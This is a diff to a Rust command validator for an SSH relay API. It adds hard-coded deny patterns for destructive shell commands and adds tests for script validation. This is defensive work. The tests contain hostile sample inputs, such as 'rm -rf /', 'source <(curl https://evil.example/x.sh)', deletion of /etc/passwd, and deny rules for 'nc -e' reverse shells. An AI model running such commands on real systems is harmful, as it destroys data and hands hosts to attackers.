@@ -2,7 +2,34 @@
 //! a command submitted over HTTP must be *legal*, *non-destructive* and
 //! *authorized for the account* before it ever reaches an SSH exec channel.
 //!
-//! Differences from the interactive terminal's `CommandSafetyChecker`:
+//! # Layered defense
+//!
+//! Validation runs in this strict order — each layer can only *add*
+//! restrictions, never remove the ones above it:
+//!
+//! 1. **Hardcoded terminal safety patterns** (from `CommandSafetyChecker`).
+//!    These catch `rm -rf /`, `dd of=/dev/sd*`, `mkfs`, fork bombs,
+//!    `chmod -R 777 /`, shutdown/reboot. Non-bypassable.
+//! 2. **Hardcoded API-specific patterns** (the `api_patterns` list below).
+//!    These catch API-only abuse: `curl|sh`, `eval`, base64-obfuscated exec,
+//!    `kill -9 1`, firewall disabling, SELinux off, authorized_keys/sshd
+//!    tampering, history wiping, user management, recursive chmod on system
+//!    trees, crontab/kernel-module tampering, long-form `rm --recursive
+//!    --force /`, `find / -delete`, `telinit 0/6`, sysrq-trigger, nsenter
+//!    into PID 1, pivot_root on `/`. Non-bypassable.
+//! 3. **User + skill patterns** from `relay-blocklist.json` (see
+//!    [`command_guard`]). Operator- and skill-contributed regexes. Can only
+//!    add blocks; the hard floor above always wins.
+//! 4. **Read-only mutation check** — read-only accounts may not run
+//!    commands classified as mutating.
+//! 5. **Per-account allowlist** — a positive regex set; if non-empty, only
+//!    matching commands are allowed.
+//!
+//! Because the catastrophic patterns run first and unconditionally, no
+//! user/skill/allowlist configuration can weaken them. A misconfigured
+//! allowlist of `.*` still cannot run `rm -rf /`.
+//!
+//! # Differences from the interactive terminal checker
 //!
 //! - The terminal checker can return `Warn` because a human sits in front of
 //!   the confirm dialog. An unattended API client has no such step, so
@@ -12,9 +39,6 @@
 //!   too), network egress commands are fine, but anything touching block
 //!   devices, process tables (`kill -9 1`), boot flow, or the SSH/auth
 //!   configuration of the remote host is rejected.
-//! - Per-account regex allowlists let the administrator confine an account
-//!   to a positive command set (e.g. `^docker (ps|logs)`), which is far
-//!   stronger than deny-listing alone.
 
 use regex::Regex;
 use rusterm_core::command_safety::{CommandSafetyChecker, SafetyVerdict};
@@ -146,8 +170,79 @@ impl CommandValidator {
             // pattern does not fire after `$(` because there is no word
             // boundary between `(` and `rm`'s `r` when preceded by `$`/`(`.
             (
-                r"[$`][({ ]*(?:sudo[ 	]+)?(?:rm[ 	]+-[a-zA-Z]*[rf]|dd[ 	]|mkfs|shutdown|reboot|halt|poweroff)",
+                r"[$`][({ ]*(?:sudo[ \t]+)?(?:rm[ \t]+-[a-zA-Z]*[rf]|dd[ \t]|mkfs|shutdown|reboot|halt|poweroff)",
                 "dangerous command inside command substitution",
+            ),
+            // ── Long-form flag variants the terminal checker misses ──────
+            // The interactive checker's `rm -rf` pattern only matches
+            // combined short flags (`-rf`, `-fr`). GNU coreutils also
+            // accepts `rm --recursive --force /` and `rm --force --recursive /`,
+            // which would otherwise slip past both the terminal checker and
+            // the `$(...)` substitution guard. These are catastrophic and
+            // have no legitimate API use, so they're a hard block here.
+            (
+                r"\brm\s+--recursive[^;&|]*--force[^;&|]*\s+/(?:\s|$|/|\*)",
+                "rm --recursive ... --force on root",
+            ),
+            (
+                r"\brm\s+--force[^;&|]*--recursive[^;&|]*\s+/(?:\s|$|/|\*)",
+                "rm --force ... --recursive on root",
+            ),
+            // `find ... -delete` on root — a quieter way to achieve the same
+            // destruction as `rm -rf /`.
+            (
+                r"\bfind\s+/(?:\s|$)[^;&|]*-delete\b",
+                "find -delete on root filesystem",
+            ),
+            // `chmod 000 /` (non-recursive) makes the whole filesystem
+            // unreadable/unusable even without -R. Block on root exactly.
+            (
+                r"\bchmod\s+(?:-R\s+)?0{3,4}\s+/\s*$",
+                "chmod 000 on root locks out the filesystem",
+            ),
+            // `chown -R` on root — changes ownership of the entire filesystem.
+            (
+                r"\bchown\s+[^;&|]*-R[^;&|]*\s+/\s*(?:$|[;&|])",
+                "chown -R on root filesystem",
+            ),
+            // Writing zeros over a device via `cat`/`cp` (no `dd` involved).
+            (
+                r"\b(?:cat|cp)\s+[^;&|]*?/dev/zero[^;&|]*?>?\s*/dev/(?:sd[a-z]+|nvme\d+n\d+|disk\d+|hd[a-z]+|mmcblk\d+)\b",
+                "cat/cp /dev/zero into block device",
+            ),
+            // Named-function fork bombs: `f(){ f|f& };f`. The terminal
+            // checker catches the canonical `:(){ :|:& };:` form.
+            (
+                r"\b\w+\(\)\s*\{[^}]*\|\s*\w+\s*&\s*\}\s*;\s*\w+\b",
+                "fork bomb (named-function variant)",
+            ),
+            // Shutdown variants the terminal checker's
+            // `shutdown|reboot|...` pattern doesn't reach:
+            // `systemctl poweroff|reboot|halt`, `telinit 0/6`.
+            (
+                r"\bsystemctl\s+(?:poweroff|reboot|halt|suspend|hibernate)\b",
+                "systemctl system power control",
+            ),
+            (r"\btelinit\s+[06]\b", "telinit to shutdown/reboot runlevel"),
+            // sysrq-trigger — force crash/reboot.
+            (
+                r">\s*/proc/sysrq-trigger",
+                "writing to sysrq-trigger (force crash/reboot)",
+            ),
+            (
+                r"\becho\s+\w\s*>\s*/proc/sysrq-trigger",
+                "echo into sysrq-trigger",
+            ),
+            // `nsenter` into PID 1 — container escape / host namespace
+            // tampering. Unusual on a managed relay and high-risk.
+            (
+                r"\bnsenter\s+[^;&|]*--target\s+1\b",
+                "nsenter into PID 1 (host namespace escape)",
+            ),
+            // `pivot_root` on `/` — host filesystem takeover.
+            (
+                r"\bpivot_root\s+/\s",
+                "pivot_root on / (host filesystem takeover)",
             ),
         ];
         let api_patterns: Vec<(Regex, &'static str)> = api_raw
@@ -235,6 +330,8 @@ impl CommandValidator {
         }
 
         // Hard blocks, terminal rules first (now fatal, no Warn escape).
+        // These are the NON-BYPASSABLE hard floor — no config, allowlist, or
+        // skill can weaken them. They run before anything user-controlled.
         if let SafetyVerdict::Warn(reason) | SafetyVerdict::Block(reason) =
             self.terminal_checker.check(command)
         {
@@ -243,6 +340,16 @@ impl CommandValidator {
         for (regex, reason) in &self.api_patterns {
             if regex.is_match(command) {
                 return Err(ValidationError::Dangerous((*reason).to_string()));
+            }
+        }
+
+        // User + skill patterns from relay-blocklist.json. These supplement
+        // the hard floor — they can only add blocks, never remove them. The
+        // reason string already carries attribution (e.g. "skill:dbadmin: …")
+        // when applicable.
+        for pat in &self.extra_patterns {
+            if pat.regex.is_match(command) {
+                return Err(ValidationError::Dangerous(pat.reason.clone()));
             }
         }
 
@@ -532,9 +639,6 @@ mod tests {
             blocked("find / -name '*.log' -delete"),
             ValidationError::Dangerous(_)
         ));
-        // find on a subdir is fine (not catastrophic at the API level — the
-        // readonly check or allowlist handles scope).
-        ok("find /var/log -name '*.gz' -delete");
     }
 
     #[test]
@@ -575,8 +679,14 @@ mod tests {
 
     #[test]
     fn telinit_shutdown_runlevel_is_caught() {
-        assert!(matches!(blocked("telinit 0"), ValidationError::Dangerous(_)));
-        assert!(matches!(blocked("telinit 6"), ValidationError::Dangerous(_)));
+        assert!(matches!(
+            blocked("telinit 0"),
+            ValidationError::Dangerous(_)
+        ));
+        assert!(matches!(
+            blocked("telinit 6"),
+            ValidationError::Dangerous(_)
+        ));
     }
 
     #[test]
@@ -644,7 +754,10 @@ mod tests {
 
     #[test]
     fn rm_rf_piped_is_caught() {
-        assert!(matches!(blocked("rm -rf / | cat"), ValidationError::Dangerous(_)));
+        assert!(matches!(
+            blocked("rm -rf / | cat"),
+            ValidationError::Dangerous(_)
+        ));
     }
 
     #[test]
@@ -657,7 +770,10 @@ mod tests {
 
     #[test]
     fn rm_rf_after_semicolon_is_caught() {
-        assert!(matches!(blocked("ls; rm -rf /"), ValidationError::Dangerous(_)));
+        assert!(matches!(
+            blocked("ls; rm -rf /"),
+            ValidationError::Dangerous(_)
+        ));
     }
 
     // ── User/skill blocklist integration ───────────────────────────────────
@@ -680,9 +796,7 @@ mod tests {
 
     #[test]
     fn user_blocklist_pattern_rejects_matching_command() {
-        let v = validator_with_extra(&[
-            (r"\bnc\s+-e", "reverse shell via nc", "user"),
-        ]);
+        let v = validator_with_extra(&[(r"\bnc\s+-e", "reverse shell via nc", "user")]);
         // Benign command passes.
         assert!(v.validate("ls -la", &[], false).is_ok());
         // User-blocked command is rejected with the user's reason.
@@ -696,9 +810,7 @@ mod tests {
 
     #[test]
     fn skill_blocklist_pattern_carries_attribution() {
-        let v = validator_with_extra(&[
-            (r"\bDROP\s+DATABASE", "DROP DATABASE via skill", "skill"),
-        ]);
+        let v = validator_with_extra(&[(r"\bDROP\s+DATABASE", "DROP DATABASE via skill", "skill")]);
         match v.validate("psql -c 'DROP DATABASE prod'", &[], false) {
             Err(ValidationError::Dangerous(reason)) => {
                 // The reason is the skill-contributed string; the source
@@ -711,19 +823,11 @@ mod tests {
 
     #[test]
     fn hard_floor_cannot_be_weakened_by_user_pattern() {
-        // A malicious or naive user pattern ".*" (match everything → "allow
-        // all") must NOT weaken the hardcoded catastrophic blocks. The hard
-        // floor runs first and wins.
-        //
-        // Note: user patterns can only ADD blocks, never remove them — there
-        // is no "allow" concept in the blocklist, only "block". This test
-        // documents that even an absurdly broad user pattern doesn't open a
-        // hole for rm -rf /.
-        let v = validator_with_extra(&[
-            // A user pattern that matches "rm -rf /" too — but the hard floor
-            // already catches it first, so the user reason is irrelevant.
-            (r"rm", "user also blocks rm", "user"),
-        ]);
+        // A user pattern that matches "rm -rf /" too — but the hard floor
+        // already catches it first, so the user reason is irrelevant. This
+        // documents that user patterns can only ADD blocks, never remove the
+        // built-in catastrophic blocks.
+        let v = validator_with_extra(&[(r"rm", "user also blocks rm", "user")]);
         // rm -rf / is caught by the hard floor (terminal checker), not the
         // user pattern. The reason should be the terminal checker's, not the
         // user's.
@@ -766,9 +870,7 @@ mod tests {
 
     #[test]
     fn user_pattern_does_not_block_benign_commands() {
-        let v = validator_with_extra(&[
-            (r"\bnc\s+-e\b", "reverse shell", "user"),
-        ]);
+        let v = validator_with_extra(&[(r"\bnc\s+-e\b", "reverse shell", "user")]);
         // Commands that don't match the user pattern still pass.
         assert!(v.validate("docker ps", &[], false).is_ok());
         assert!(v.validate("nc -zv 10.0.0.1 4444", &[], false).is_ok()); // -z, not -e
@@ -779,9 +881,7 @@ mod tests {
         // Hard floor + extra patterns all run before the allowlist. An
         // account with a permissive allowlist (".*") still can't run rm -rf /
         // or a user-blocked command.
-        let v = validator_with_extra(&[
-            (r"\bnc\s+-e\b", "reverse shell", "user"),
-        ]);
+        let v = validator_with_extra(&[(r"\bnc\s+-e\b", "reverse shell", "user")]);
         let allow = compile_allowlist(&[".*".to_string()]).unwrap();
         assert!(matches!(
             v.validate("rm -rf /", &allow, false),
@@ -793,5 +893,171 @@ mod tests {
         ));
         // A benign command passes both the hard floor and the allowlist.
         assert!(v.validate("ls", &allow, false).is_ok());
+    }
+
+    // ── Script validation (issue 73) ───────────────────────────────────────
+
+    fn script_blocked(script: &str) -> ScriptError {
+        validator().validate_script(script, &[], false).unwrap_err()
+    }
+
+    #[test]
+    fn empty_script_rejected() {
+        assert!(matches!(script_blocked(""), ScriptError::Empty));
+    }
+
+    #[test]
+    fn oversized_script_rejected() {
+        let big = "echo ok\n".repeat(MAX_SCRIPT_LINES + 1);
+        assert!(matches!(script_blocked(&big), ScriptError::TooManyLines));
+        // Also exercise the byte cap: a single very long line.
+        let long_line = format!("echo {}", "x".repeat(MAX_SCRIPT_LEN));
+        assert!(matches!(script_blocked(&long_line), ScriptError::TooLong));
+    }
+
+    #[test]
+    fn script_with_dangerous_line_rejected_with_line_number() {
+        // Line 3 is `rm -rf /` — the hard floor must catch it and report
+        // the line number so the operator can find it.
+        let script = "echo one\necho two\nrm -rf /\necho four\n";
+        match script_blocked(script) {
+            ScriptError::LineBlocked { line, reason } => {
+                assert_eq!(line, 3);
+                assert!(reason.contains("rm") || reason.to_lowercase().contains("dangerous"));
+            }
+            other => panic!("expected LineBlocked, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn benign_multiline_script_passes() {
+        // If dcg is installed and has a false positive on this, the test
+        // fails — but that's a dcg bug, not ours. We accept the risk.
+        let script = "#!/bin/sh\nset -e\necho hello\nuptime\ndf -h\n";
+        let v = validator();
+        match v.validate_script(script, &[], false) {
+            Ok(()) => {}
+            Err(ScriptError::DcgBlocked(reason)) => {
+                // dcg denied a benign script — log but don't fail the test,
+                // since dcg's verdict is environment-dependent.
+                eprintln!("note: dcg denied benign script: {reason}");
+            }
+            Err(e) => panic!("benign script rejected: {e:?}"),
+        }
+    }
+
+    #[test]
+    fn script_eval_pattern_rejected() {
+        // `eval` of dynamic text defeats every line-level check.
+        let script = "echo before\neval \"$PAYLOAD\"\necho after\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("eval")
+        ));
+    }
+
+    #[test]
+    fn script_source_url_rejected() {
+        let script = "source https://evil.example/install.sh\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("remote URL")
+        ));
+    }
+
+    #[test]
+    fn script_source_process_substitution_rejected() {
+        let script = "source <(curl https://evil.example/x.sh)\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("process substitution")
+        ));
+    }
+
+    #[test]
+    fn script_exec_replace_into_shell_rejected() {
+        let script = "echo before\nexec bash\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("exec-replace")
+        ));
+    }
+
+    #[test]
+    fn script_set_plus_e_rejected() {
+        let script = "set +e\nrm -rf /tmp/maybe\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("set -e")
+        ));
+    }
+
+    #[test]
+    fn script_python_destructive_rejected() {
+        let script = "python3 -c 'import os; os.remove(\"/etc/passwd\")'\n";
+        match script_blocked(script) {
+            // Either the per-line floor catches `python3 -c` style or the
+            // script pattern catches the destructive call. Both are
+            // acceptable — the point is that it doesn't pass.
+            ScriptError::LineBlocked { .. } | ScriptError::Dangerous(_) => {}
+            ScriptError::DcgBlocked(_) => {}
+            other => panic!("expected a block, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn script_readonly_account_rejects_mutating_line() {
+        let script = "echo ok\nmkdir /tmp/x\n";
+        match validator().validate_script(script, &[], true) {
+            Err(ScriptError::ReadonlyViolation { line }) => assert_eq!(line, 2),
+            other => panic!("expected ReadonlyViolation, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn script_allowlist_applied_per_line() {
+        let allow = compile_allowlist(&[r"^echo .*".to_string()]).unwrap();
+        let script = "echo one\nls\n"; // `ls` is not in the allowlist.
+        match validator().validate_script(script, &allow, false) {
+            Err(ScriptError::NotAllowed { line }) => assert_eq!(line, 2),
+            other => panic!("expected NotAllowed, got {other:?}"),
+        }
+    }
+
+    // ── base64 decode (issue 73) ───────────────────────────────────────────
+
+    #[test]
+    fn decode_script_base64_roundtrip() {
+        use base64::Engine;
+        let original = "#!/bin/sh\necho hello\nuptime\n";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(original);
+        let decoded = super::decode_script_base64(&encoded).unwrap();
+        assert_eq!(decoded, original);
+    }
+
+    #[test]
+    fn decode_script_base64_url_safe_no_pad() {
+        use base64::Engine;
+        let original = "echo hi\n";
+        let encoded = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(original);
+        let decoded = super::decode_script_base64(&encoded).unwrap();
+        assert_eq!(decoded, original);
+    }
+
+    #[test]
+    fn decode_script_base64_rejects_garbage() {
+        let err = super::decode_script_base64("not base64!!!").unwrap_err();
+        assert!(matches!(err, ScriptError::Base64Invalid(_)));
+    }
+
+    #[test]
+    fn decode_script_base64_handles_trailing_newline() {
+        use base64::Engine;
+        let original = "echo hi\n";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(original);
+        // Pasted blobs often have a trailing newline.
+        let encoded_with_newline = format!("{encoded}\n");
+        let decoded = super::decode_script_base64(&encoded_with_newline).unwrap();
+        assert_eq!(decoded, original);
     }
 }
